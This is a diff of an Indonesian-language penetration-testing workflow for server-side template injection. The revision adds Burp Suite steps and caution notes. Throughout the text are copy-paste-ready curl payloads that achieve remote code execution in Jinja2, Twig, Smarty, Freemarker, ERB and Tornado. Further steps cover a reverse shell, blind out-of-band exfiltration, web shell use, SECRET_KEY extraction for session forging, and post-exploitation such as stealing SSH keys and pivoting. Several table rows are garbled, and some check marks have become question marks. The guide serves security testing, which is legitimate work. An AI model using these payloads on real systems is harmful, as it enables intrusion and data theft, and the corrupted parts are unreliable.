-# [Workflow 23 â€” Server-Side Template Injection (SSTI)](/docs/ssti) — Complete Interactive Decision Workflow
+# [Workflow 23 — Server-Side Template Injection (SSTI)](/docs/ssti) — Complete Interactive Decision Workflow
 
-> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
+> **Cara baca dokumen ini:** Setiap langkah punya alur **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
+> 
+> **Method A / Method B:** Di titik-titik kunci (deteksi awal, fingerprinting engine, information disclosure), langkah di bawah menampilkan dua jalur yang setara — **Method A (Burp Repeater)** untuk analisis interaktif, dan **Method B (CLI)** untuk reproduksi cepat/scripting. Command CLI yang sudah ada di bawah ini TETAP dipakai sebagai Method B; Method A ditambahkan sebagai alternatif, bukan pengganti. Lihat [Bagian 11](#bagian-11--testing-interfaces--automation) untuk detail masing-masing interface dan [Tool Decision Guide](#1110-tool-decision-guide) untuk kapan memilih yang mana.
 
 ---
 
-## 🔧 PRE-FLIGHT: Setup Environment
+## → PRE-FLIGHT: Setup Environment
 
 Bash
 
@@ -4931,9 +5163,18 @@ text
 
 ## ═══════════════════════════════════════════
 
-> **Tujuan:** Sebelum test SSTI, kita harus tahu DI MANA input dimasukkan dan apakah server merefleksikannya.
+> **Tujuan:** Sebelum test SSTI, kita harus tahu DI MANA input dimasukkan dan apakah server merefleksikannya.
 
 ### Langkah 0.1 — Identifikasi Entry Point
+
+## Method A — Burp Suite
+
+1. Arahkan browser ke Burp Proxy, jelajahi aplikasi secara normal.
+2. Buka **HTTP History**, klik salah satu request ke aplikasi.
+3. Lihat tab **Response → Headers**: cari `Server`, `X-Powered-By`, `Set-Cookie` untuk petunjuk teknologi (lihat tabel di bawah).
+4. Catat request yang menarik (form, search, profile) untuk dikirim ke Repeater pada langkah berikutnya.
+
+## Method B — CLI
 
 Bash
 
@@ -4964,12 +5205,12 @@ text
 
 |Server Header|Kemungkinan Engine|Priority|
 |---|---|---|
-|`Werkzeug` / `Flask`|Jinja2|⭐⭐⭐|
-|`PHP`|Twig atau Smarty|⭐⭐⭐|
-|`Express` / `Node.js`|Handlebars / Nunjucks|⭐⭐|
-|`Tomcat` / `JSESSIONID`|Freemarker / Velocity|⭐⭐⭐|
-|`Ruby` / `Rails`|ERB|⭐⭐⭐|
-|`Tornado`|Tornado (Python)|⭐⭐|
+|`Werkzeug` / `Flask`|Jinja2|✅|
+|`PHP`|Twig atau Smarty|✅|
+|`Express` / `Node.js`|Handlebars / Nunjucks|✅|
+|`Tomcat` / `JSESSIONID`|Freemarker / Velocity|✅|
+|`Ruby``Werkzeug` / `Flask``Rails`|ERB|✅|
+|`Tornado`|Tornado (Python)|✅|
 
 **OUTPUT GAGAL ❌ — Tidak ada petunjuk di header:**
 
@@ -4979,11 +5220,22 @@ text
 < Server: nginx/1.18.0
 ```
 
-➡️ Server disembunyikan. Lanjut ke Langkah 0.2, kita akan deteksi dari behavior.
+📌 Server disembunyikan. Lanjut ke Langkah 0.2, kita akan deteksi dari behavior.
+
+**STOP:** Header saja bukan bukti engine — ini baru _candidate_, bukan _confirmed_. Discriminator test (Langkah 1.2) tetap wajib sebelum menyimpulkan engine.
 
 ---
 
 ### Langkah 0.2 — Temukan Parameter yang Direfleksikan
+
+## Method A — Burp Suite
+
+1. Di **HTTP History**, kirim request kandidat (search, form, dsb) ke **Repeater**.
+2. Ubah parameter yang dicurigai menjadi string unik, mis. `TESTSTRING123`.
+3. Kirim (Send) dan periksa tab **Response** apakah `TESTSTRING123` muncul di body.
+4. Ulangi untuk header yang sering direfleksikan (`User-Agent`, `Referer`, `X-Forwarded-For`) dengan mengedit request langsung di Repeater.
+
+## Method B — CLI
 
 Bash
 
@@ -5015,7 +5267,7 @@ HTML
 <p>Search result for: TESTSTRING123</p>
 ```
 
-➡️ **Simpan endpoint ini!**
+✅ **Simpan endpoint ini!**
 
 Bash
 
@@ -5026,7 +5278,9 @@ export INJECT_METHOD="GET"
 echo "[*] Injection point: $INJECT_METHOD $INJECT_URL param=$INJECT_PARAM"
 ```
 
-➡️ Lanjut ke **FASE 1.**
+➡️ Lanjut ke **FASE 1.**
+
+**STOP:** Refleksi string biasa ≠ SSTI. Ini baru bukti input sampai ke output — belum bukti bahwa ada expression evaluation. Jangan lompat ke payload RCE dari titik ini.
 
 **OUTPUT GAGAL ❌ — Input tidak muncul di response:**
 
@@ -5036,8 +5290,8 @@ text
 (tidak ada TESTSTRING123 di output)
 ```
 
-➡️ Input mungkin diproses di backend tanpa ditampilkan. Ini bisa **Blind SSTI**.  
-➡️ Coba:
+⚠️ Input mungkin diproses di backend tanpa ditampilkan. Ini bisa jadi **Blind SSTI**.  
+📌 Coba:
 
 Bash
 
@@ -5062,9 +5316,18 @@ echo "With expression: $TEST_LEN bytes"
 
 ## ═══════════════════════════════════════════
 
-> **Tujuan:** Konfirmasi bahwa server MENGEVALUASI expression kita, bukan hanya merefleksikan string.
+> **Tujuan:** Konfirmasi bahwa server MENGEVALUASI expression kita, bukan hanya merefleksikan string.
 
 ### Langkah 1.1 — Universal Detection (Jalankan Semua)
+
+## Method A — Burp Suite
+
+1. Di Repeater, dari baseline (Langkah 0.2), buat request baru dengan mengganti `INJECT_PARAM` menjadi `{{7*7}}`. Send.
+2. Bandingkan body response terhadap baseline (`hello` / `TESTSTRING123`).
+3. Ulangi untuk syntax lain satu per satu: `${7*7}`, `{7*7}`, `<%= 7*7 %>`, `#set($x=7*7)$x` — masing-masing sebagai request terpisah di Repeater agar histori perbandingan tetap terlihat.
+4. Kalau ingin menjalankan seluruh syntax sekaligus, pindah ke **Intruder** dengan payload list berisi kelima varian ini (lihat [11.4](#114-burp-intruder)).
+
+## Method B — CLI
 
 Bash
 
@@ -5098,15 +5361,15 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=#set(\$x=7*7)\$x"
 
 |Payload yang Dikirim|Response|Interpretasi|
 |---|---|---|
-|`{{7*7}}`|`49`|✅ Engine `{{}}` aktif!|
-|`{{7*7}}`|`{{7*7}}` (literal)|❌ Tidak dievaluasi|
-|`${7*7}`|`49`|✅ Engine `${}` aktif!|
-|`{7*7}`|`49`|✅ Smarty kandidat|
-|`<%= 7*7 %>`|`49`|✅ ERB (Ruby)|
-|`#set($x=7*7)$x`|`49`|✅ Velocity|
-|Apapun|Error 500|✅ Engine ada, perlu investigate error|
+|`{{7*7}}`|`49`|✅ Engine `{{}}` aktif!|
+|`{{7*7}}`|`{{7*7}}` (literal)|❌ Tidak dievaluasi|
+|`${7*7}`|`49`|✅ Engine `${}` aktif!|
+|`{7*7}`|`49`|→ Smarty kandidat|
+|`<%= 7*7 %>`|`49`|→ ERB (Ruby)|
+|`#set($x=7*7)$x`|`49`|→ Velocity|
+|Apapun|Error 500|→ Engine ada, perlu investigate error|
 
-**OUTPUT BERHASIL ✅ — `{{7*7}}` menghasilkan `49`:**
+**OUTPUT BERHASIL ✅ — `{{7*7}}` menghasilkan `49`:**
 
 HTML
 
@@ -5114,8 +5377,10 @@ HTML
 <p>Search result for: 49</p>
 ```
 
-➡️ **SSTI TERKONFIRMASI!** Engine menggunakan syntax `{{ }}`.  
-➡️ Lanjut ke **Langkah 1.2** untuk identifikasi engine spesifik.
+✅ **SSTI TERKONFIRMASI (expression evaluation)!** Engine menggunakan syntax `{{ }}`.  
+➡️ Lanjut ke **Langkah 1.2** untuk identifikasi engine spesifik.
+
+**STOP:** `{{7*7}} → 49` adalah _expression evaluated_, bukan _engine confirmed_. Beberapa engine (Jinja2, Twig, Tornado, Pebble) berbagi syntax `{{ }}` — discriminator test di Langkah 1.2 wajib dijalankan sebelum memilih workflow engine tertentu.
 
 **OUTPUT GAGAL ❌ — Semua payload literal (tidak dievaluasi):**
 
@@ -5125,7 +5390,7 @@ HTML
 <p>Search result for: {{7*7}}</p>
 ```
 
-➡️ Beberapa kemungkinan:
+📌 Beberapa kemungkinan:
 
 1. Input di-escape sebelum masuk template
 2. WAF memblokir
@@ -5144,7 +5409,7 @@ curl -s "$INJECT_URL?${INJECT_PARAM}=%257B%257B7*7%257D%257D"
 curl -s -X POST "$INJECT_URL" -d "${INJECT_PARAM}={{7*7}}"
 ```
 
-**OUTPUT ERROR ❌ — Server Error 500:**
+**OUTPUT ERROR → — Server Error 500:**
 
 text
 
@@ -5152,8 +5417,8 @@ text
 Internal Server Error
 ```
 
-➡️ **INI BAGUS!** Error bisa berarti engine mengevaluasi tapi ada syntax error.  
-➡️ Cek error message untuk fingerprint engine:
+✅ **INI BAGUS!** Error bisa berarti engine mengevaluasi tapi ada syntax error.  
+📌 Cek error message untuk fingerprint engine:
 
 Bash
 
@@ -5165,7 +5430,15 @@ curl -s "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{" 2>&1 | grep -iE "(ji
 
 ### Langkah 1.2 — Engine Identification (Discriminator Test)
 
-> Setelah `{{7*7}}` → `49`, kita perlu identifikasi SPESIFIK enginenya.
+> Setelah `{{7*7}}` → `49` (expression evaluation candidate), kita perlu discriminator independen untuk naik status menjadi engine confirmed.
+
+## Method A — Burp Suite
+
+1. Dari request `{{7*7}}` yang sudah ada di Repeater, buat tab baru (Ctrl+R) dan ganti payload menjadi `{{7*'7'}}`.
+2. Send, lalu bandingkan body terhadap response `{{7*7}}` sebelumnya.
+3. `7777777` → Jinja2 candidate. `49` (tetap) → Twig candidate. Simpan kedua response ini sebagai evidence sebelum lanjut ke FASE 2.
+
+## Method B — CLI
 
 Bash
 
@@ -5175,7 +5448,7 @@ Bash
 curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*'7'}}"
 ```
 
-**OUTPUT BERHASIL ✅ — `7777777` (tujuh kali angka 7):**
+**OUTPUT BERHASIL ✅ — `7777777` (tujuh kali angka 7):**
 
 HTML
 
@@ -5183,11 +5456,13 @@ HTML
 <p>Search result for: 7777777</p>
 ```
 
-➡️ **INI JINJA2!** Python melakukan string * int = string repetition.  
-➡️ Catat: `export ENGINE="jinja2"`  
-➡️ Lanjut ke **FASE 2A — Jinja2 Workflow.**
+✅ **JINJA2 CANDIDATE (strong).** Python melakukan string * int = string repetition — ini discriminator independen, bukan sekadar payload kedua yang kebetulan berhasil.  
+📌 Catat: `export ENGINE="jinja2"`  
+➡️ Lanjut ke **FASE 2A — Jinja2 Workflow**, di mana confirmation lebih lanjut (stack trace / framework fingerprint) akan menaikkan status ke _confirmed_.
 
-**OUTPUT BERHASIL ✅ — `49` (tetap 49):**
+**STOP:** `7777777` menunjukkan Jinja2 candidate yang kuat, tapi confidence penuh (_confirmed_) baru tercapai setelah independent evidence lain (error message, `{{config}}` berhasil, atau stack trace) cocok di FASE 2A. Jangan langsung mengklaim "Jinja2 confirmed" hanya dari satu discriminator.
+
+**OUTPUT BERHASIL ✅ — `49` (tetap 49):**
 
 HTML
 
@@ -5195,7 +5470,7 @@ HTML
 <p>Search result for: 49</p>
 ```
 
-➡️ Kemungkinan **TWIG** (PHP). Lakukan konfirmasi:
+📌 Kemungkinan **TWIG** (PHP). Lakukan konfirmasi:
 
 Bash
 
@@ -5207,8 +5482,8 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{_self}}" | grep -i "t
 curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{app}}"
 ```
 
-➡️ Catat: `export ENGINE="twig"`  
-➡️ Lanjut ke **FASE 2B — Twig Workflow.**
+📌 Catat: `export ENGINE="twig"`  
+📌 Lanjut ke **FASE 2B — Twig Workflow.**
 
 **OUTPUT GAGAL ❌ — Error atau literal:**
 
@@ -5218,7 +5493,7 @@ text
 TemplateSyntaxError / literal output
 ```
 
-➡️ Baca error message dengan teliti:
+📌 Baca error message dengan teliti:
 
 Bash
 
@@ -5237,7 +5512,7 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{7*'7'}}" 2>&1 | \
 |`SmartyException`|Smarty|
 |`freemarker.core`|Freemarker|
 |`org.apache.velocity`|Velocity|
-|`ActionView` / `ERB`|Ruby ERB|
+|`ActionView``Werkzeug` / `Flask``ERB`|Ruby ERB|
 |`tornado.template`|Tornado|
 
 ---
@@ -5275,7 +5550,7 @@ text
 [+] Jinja2 is vulnerable
 ```
 
-➡️ Konfirmasi engine terdeteksi. Lanjut ke fase yang sesuai.
+📌 Konfirmasi engine terdeteksi. Lanjut ke fase yang sesuai.
 
 **OUTPUT GAGAL ❌ — Tools tidak mendeteksi:**
 
@@ -5285,7 +5560,7 @@ text
 [*] Tested 6 rendering engines. No injection detected.
 ```
 
-➡️ Coba dengan konfigurasi manual:
+📌 Coba dengan konfigurasi manual:
 
 Bash
 
@@ -5309,7 +5584,7 @@ python3 ~/tools/tplmap/tplmap.py \
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `{{7*7}}` → `49` DAN `{{7*'7'}}` → `7777777`
+> **Masuk sini jika:** `{{7*7}}`→ `49` DAN `{{7*'7'}}`→ `7777777`
 
 ### Langkah 2A.1 — Information Disclosure (SELALU LAKUKAN INI DULU)
 
@@ -5345,7 +5620,7 @@ Python
 }>
 ```
 
-➡️ **SIMPAN SEMUA INFO INI:**
+✅ **SIMPAN SEMUA INFO INI:**
 
 Bash
 
@@ -5360,9 +5635,9 @@ SECRET_KEY=$(grep -oP "SECRET_KEY.*?'([^']+)'" ~/ssti_loot/output/config_dump.tx
 echo "[!] SECRET_KEY: $SECRET_KEY"
 ```
 
-➡️ Jika ada `SECRET_KEY` → bisa forge Flask session cookie (lihat `<a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>`)
+📌 Jika ada `SECRET_KEY`→ bisa forge Flask session cookie (lihat [🔐 28 — JWT Workflow](/docs/jwt))
 
-**OUTPUT GAGAL ❌ — `config` undefined:**
+**OUTPUT GAGAL ❌ — `config` undefined:**
 
 text
 
@@ -5370,7 +5645,7 @@ text
 Undefined
 ```
 
-➡️ Tidak dalam Flask context atau config diblokir. Coba:
+📌 Tidak dalam Flask context atau config diblokir. Coba:
 
 Bash
 
@@ -5386,7 +5661,7 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={{url_for.__globals__}}
 
 ### Langkah 2A.2 — Jinja2 RCE via Built-in Globals (COBA INI PERTAMA!)
 
-> **Kenapa ini dulu?** Tidak perlu cari index subclasses yang beda-beda per environment.
+> **Kenapa ini dulu?** Tidak perlu cari index subclasses yang beda-beda per environment.
 
 Bash
 
@@ -5417,7 +5692,7 @@ HTML
 </p>
 ```
 
-➡️ **RCE CONFIRMED!**
+✅ **RCE CONFIRMED!**
 
 Bash
 
@@ -5438,9 +5713,9 @@ rce "ls -la /home"
 rce "cat /proc/1/cmdline | tr '\0' ' '"
 ```
 
-➡️ Setelah recon, lanjut ke **Langkah 2A.5 — Reverse Shell**
+📌 Setelah recon, lanjut ke **Langkah 2A.5 — Reverse Shell**
 
-**OUTPUT GAGAL ❌ — `cycler` tidak tersedia / undefined:**
+**OUTPUT GAGAL ❌ — `cycler` tidak tersedia / undefined:**
 
 text
 
@@ -5448,7 +5723,7 @@ text
 UndefinedError: 'cycler' is undefined
 ```
 
-➡️ Tidak dalam Flask context, coba method lain:
+📌 Tidak dalam Flask context, coba method lain:
 
 Bash
 
@@ -5458,7 +5733,7 @@ curl -sG "$INJECT_URL" \
     --data-urlencode "${INJECT_PARAM}={{request.__class__.__mro__[1].__subclasses__()}}"
 ```
 
-➡️ Lanjut ke **Langkah 2A.3** (subclasses chain).
+📌 Lanjut ke **Langkah 2A.3** (subclasses chain).
 
 ---
 
@@ -5472,7 +5747,7 @@ curl -sG "$INJECT_URL" \
     --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__}}"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
@@ -5511,7 +5786,7 @@ curl -sG "$INJECT_URL" \
     --data-urlencode "${INJECT_PARAM}={{''.__class__.__mro__[1].__subclasses__()[$POPEN_INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
@@ -5527,7 +5802,7 @@ text
 IndexError: list index out of range
 ```
 
-➡️ Index berbeda. Cari lagi:
+📌 Index berbeda. Cari lagi:
 
 Bash
 
@@ -5599,7 +5874,7 @@ text
 Forbidden / WAF detected
 ```
 
-➡️ Coba Burp Intruder dengan wordlist bypass payload:
+📌 Coba Burp Intruder dengan wordlist bypass payload:
 
 Bash
 
@@ -5646,7 +5921,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
 
-➡️ **SHELL DIDAPAT!** Upgrade dulu:
+✅ **SHELL DIDAPAT!** Upgrade dulu:
 
 Bash
 
@@ -5658,7 +5933,7 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-➡️ Lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** untuk privilege escalation.
+📌 Lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** untuk privilege escalation.
 
 **OUTPUT GAGAL ❌ — Koneksi tidak masuk:**
 
@@ -5668,7 +5943,7 @@ text
 (tidak ada koneksi ke listener)
 ```
 
-➡️ Firewall memblokir outbound. Coba:
+📌 Firewall memblokir outbound. Coba:
 
 Bash
 
@@ -5689,7 +5964,7 @@ curl -s "http://$TARGET/shell.php?cmd=id"
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `{{7*7}}` → `49` DAN `{{7*'7'}}` → `49` (atau error Twig)
+> **Masuk sini jika:** `{{7*7}}`→ `49` DAN `{{7*'7'}}`→ `49` (atau error Twig)
 
 ### Langkah 2B.1 — Konfirmasi Twig
 
@@ -5776,7 +6051,7 @@ text
 Error: registerUndefinedFilterCallback is not a method
 ```
 
-➡️ Twig versi baru memblokir ini. Coba:
+📌 Twig versi baru memblokir ini. Coba:
 
 Bash
 
@@ -5802,7 +6077,7 @@ curl -sG "$INJECT_URL" \
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `{7*7}` → `49`
+> **Masuk sini jika:** `{7*7}`→ `49`
 
 ### Langkah 2C.1 — Konfirmasi dan RCE
 
@@ -5825,7 +6100,7 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={php}system('id');{/php
 curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}={\$smarty.template_object->compiler_class}"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
@@ -5841,7 +6116,7 @@ text
 Smarty Security Exception: Call to PHP function "system" is not allowed
 ```
 
-➡️ Smarty security mode aktif. Cari fungsi yang tidak diblokir:
+📌 Smarty security mode aktif. Cari fungsi yang tidak diblokir:
 
 Bash
 
@@ -5863,7 +6138,7 @@ done
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `${7*7}` → `49`
+> **Masuk sini jika:** `${7*7}`→ `49`
 
 ### Langkah 2D.1 — Konfirmasi dan Information Disclosure
 
@@ -5880,12 +6155,12 @@ curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${.data_model}"
 curl -sG "$INJECT_URL" --data-urlencode "${INJECT_PARAM}=\${.template_name}"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
 ```
-2.3.29    ← Freemarker version
+2.3.29    → Freemarker version
 ```
 
 ### Langkah 2D.2 — Freemarker RCE
@@ -5906,7 +6181,7 @@ curl -sG "$INJECT_URL" \
     --data-urlencode "${INJECT_PARAM}=<#assign jy=\"freemarker.ext.jython.JythonRuntime\"?new()><#import jy as jy2>\${jy2.exec(\"import os; print os.system('id')\")}"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
@@ -5922,7 +6197,7 @@ text
 freemarker.core._MiscTemplateException: Instantiating freemarker.template.utility.Execute is not allowed
 ```
 
-➡️ `new_builtin_class_resolver` aktif. Google:
+✅ `new_builtin_class_resolver` aktif. Google:
 
 text
 
@@ -5938,7 +6213,7 @@ site:github.com "freemarker SSTI bypass new_builtin_class_resolver"
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `<%= 7*7 %>` → `49`
+> **Masuk sini jika:** `<%= 7*7 %>`→ `49`
 
 ### Langkah 2E.1 — ERB RCE
 
@@ -5967,7 +6242,7 @@ curl -sG "$INJECT_URL" \
     --data-urlencode "${INJECT_PARAM}=<%= require 'open3'; stdout,_=Open3.capture2('id'); stdout %>"
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 HTML
 
@@ -5983,7 +6258,7 @@ HTML
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** `{{7*7}}` → `49` TAPI bukan Flask/Jinja2 (dari header fingerprint)
+> **Masuk sini jika:** `{{7*7}}`→ `49` TAPI bukan Flask/Jinja2 (dari header fingerprint)
 
 ### Langkah 2F.1 — Tornado RCE
 
@@ -6009,7 +6284,7 @@ curl -sG "$INJECT_URL" \
 # {{ __import__('os').system('id') }}  → return 0, output ke server stdout
 ```
 
-**OUTPUT BERHASIL ✅:**
+**OUTPUT BERHASIL ?:**
 
 text
 
@@ -6025,7 +6300,7 @@ uid=1000(app) gid=1000(app) groups=1000(app)
 
 ## ═══════════════════════════════════════════
 
-> **Masuk sini jika:** Expression dievaluasi tapi output TIDAK terlihat di HTTP response.
+> **Masuk sini jika:** Expression dievaluasi tapi output TIDAK terlihat di HTTP response.
 
 ### Langkah 3.1 — Konfirmasi Blind SSTI
 
@@ -6063,7 +6338,7 @@ text
 10.10.11.200 - - [01/Jan/2024] "GET /test HTTP/1.1" 200 -
 ```
 
-➡️ **Blind RCE Confirmed!** Exfiltrate data:
+✅ **Blind RCE Confirmed!** Exfiltrate data:
 
 Bash
 
@@ -6140,13 +6415,13 @@ text
 
 ```
 SSTI RCE (Shell diperoleh)
-     │
-     ├─ ─→ /etc/passwd → usernames → SSH bruteforce → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
-     ├──→ config files → DB creds → 14_database_workflow.md
-     ├──→ .ssh/id_rsa → SSH login → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
-     ├──→ App source code → hardcoded secrets → berbagai target
-     ├──→ Internal network → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
-     └──→ Privesc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
+     ?
+     ├─ 📌 /etc/passwd → usernames → SSH bruteforce → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
+     ├─ 📌 config files → DB creds → 14_database_workflow.md
+     ├─ 📌 .ssh/id_rsa → SSH login → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
+     ├─ 📌 App source code → hardcoded secrets → berbagai target
+     ├─ 📌 Internal network → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
+     ├─ 📌 Privesc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
 ```
 
 ---
@@ -6159,15 +6434,15 @@ SSTI RCE (Shell diperoleh)
 
 |Error / Situasi|Penyebab|Solusi|
 |---|---|---|
-|`{{7*7}}` literal|Bukan SSTI / di-escape|Coba syntax engine lain|
+|`{{7*7}}` literal|Bukan SSTI / di-escape|Coba syntax engine lain|
 |`UndefinedError: 'cycler'`|Bukan Flask context|Pakai subclasses chain|
 |`TemplateSyntaxError`|Syntax salah|Cek quote/bracket matching|
 |`SecurityError`|Sandbox aktif|Cari bypass atau alternative primitive|
 |`500 Internal Server Error`|Expression dievaluasi!|Baca stack trace untuk fingerprint|
-|Index `Popen` berbeda|Environment berbeda|Enumerate ulang subclasses|
+|Index `Popen` berbeda|Environment berbeda|Enumerate ulang subclasses|
 |Output kosong / blind|Stdout tidak ke HTTP|Gunakan OOB / reverse shell|
-|WAF blocking `{{`|Firewall aktif|Coba encoding / alternative syntax|
-|`os` module tidak ada|Restricted import|Coba `subprocess`, `commands`, `popen2`|
+|WAF blocking `{{`|Firewall aktif|Coba encoding / alternative syntax|
+|`os` module tidak ada|Restricted import|Coba `subprocess`, `commands`, `popen2`|
 |Payload kerja di curl tapi tidak Burp|Encoding berbeda|Bandingkan raw request|
 
 **Ketika Buntu — Google Query yang Efektif:**
@@ -6195,44 +6470,44 @@ text
 
 ```
 START: Temukan input field yang direfleksikan
-│
-├─ FASE 0: Fingerprint teknologi dari headers
-│   ├─ Werkzeug/Flask     → Curiga Jinja2
-│   ├─ PHP                → Curiga Twig/Smarty
-│   ├─ Express/Node.js    → Curiga Handlebars
-│   └─ Java/Tomcat        → Curiga Freemarker/Velocity
-│
-├─ FASE 1: Universal Detection
-│   ├─ {{7*7}} → 49       → Test {{7*'7'}}
-│   │   ├─ 7777777        → JINJA2 → FASE 2A
-│   │   └─ 49             → TWIG → FASE 2B
-│   ├─ ${7*7} → 49        → FREEMARKER → FASE 2D
-│   ├─ {7*7} → 49         → SMARTY → FASE 2C
-│   ├─ <%=7*7%> → 49      → ERB → FASE 2E
-│   └─ Error 500          → Baca stack trace → Identify engine
-│
-├─ FASE 2: Engine-Specific Exploitation
-│   ├─ Jinja2: cycler globals → subclasses chain → reverse shell
-│   ├─ Twig: registerUndefinedFilterCallback → RCE
-│   ├─ Smarty: {system("id")} → RCE
-│   ├─ Freemarker: Execute class → RCE
-│   ├─ ERB: backticks → RCE
-│   └─ Tornado: __import__('os') → RCE
-│
-├─ FASE 3: Blind SSTI
-│   ├─ Time-based confirmation
-│   ├─ OOB callback
-│   └─ Blind reverse shell
-│
-└─ FASE 4: Post-Exploitation
-    ├─ Recon (id, hostname, network, files)
-    ├─ Credential hunting (config, env, source)
-    └─ Pivot ke service lain
+↓
+📌 FASE 0: Fingerprint teknologi dari headers
+|   📌 Werkzeug/Flask     → Curiga Jinja2
+|   📌 PHP                → Curiga Twig/Smarty
+|   📌 Express/Node.js    → Curiga Handlebars
+|   📌 Java/Tomcat        → Curiga Freemarker/Velocity
+↓
+📌 FASE 1: Universal Detection
+|   📌 {{7*7}} → 49       → Test {{7*'7'}}
+|   →   📌 7777777        → JINJA2 → FASE 2A
+|   →   📌 49             → TWIG → FASE 2B
+|   📌 ${7*7} → 49        → FREEMARKER → FASE 2D
+|   📌 {7*7} → 49         → SMARTY → FASE 2C
+|   📌 <%=7*7%> → 49      → ERB → FASE 2E
+|   📌 Error 500          → Baca stack trace → Identify engine
+↓
+📌 FASE 2: Engine-Specific Exploitation
+|   📌 Jinja2: cycler globals → subclasses chain → reverse shell
+|   📌 Twig: registerUndefinedFilterCallback → RCE
+|   📌 Smarty: {system("id")} → RCE
+|   📌 Freemarker: Execute class → RCE
+|   📌 ERB: backticks → RCE
+|   📌 Tornado: __import__('os') → RCE
+↓
+📌 FASE 3: Blind SSTI
+|   📌 Time-based confirmation
+|   📌 OOB callback
+|   📌 Blind reverse shell
+↓
+📌 FASE 4: Post-Exploitation
+    📌 Recon (id, hostname, network, files)
+    📌 Credential hunting (config, env, source)
+    📌 Pivot ke service lain
 ```
 
 ---
 
-## ⚡ CHEATSHEET — COPY PASTE READY
+## → CHEATSHEET — COPY PASTE READY
 
 Bash
 
@@ -6285,9 +6560,8 @@ python3 ~/tools/sstimap/sstimap.py -u "${INJECT_URL}?${INJECT_PARAM}=*"
 
 ---
 
-> **➡️ NEXT:** Setelah SSTI berhasil dan dapat shell, lanjut ke:
+> **📌 NEXT:** Setelah SSTI berhasil dan dapat shell, lanjut ke:
 > 
-> - **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** jika target Linux
-> - **`14_database_workflow.md`** jika ketemu DB credentials dari config
-> - **[⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)](/docs/pivoting-tunneling)** jika perlu pivot ke network internal
-
+> - **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** jika target Linux
+> - **`14_database_workflow.md`** jika ketemu DB credentials dari config
+> - **[⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)](/docs/pivoting-tunneling)** jika perlu pivot ke network internal
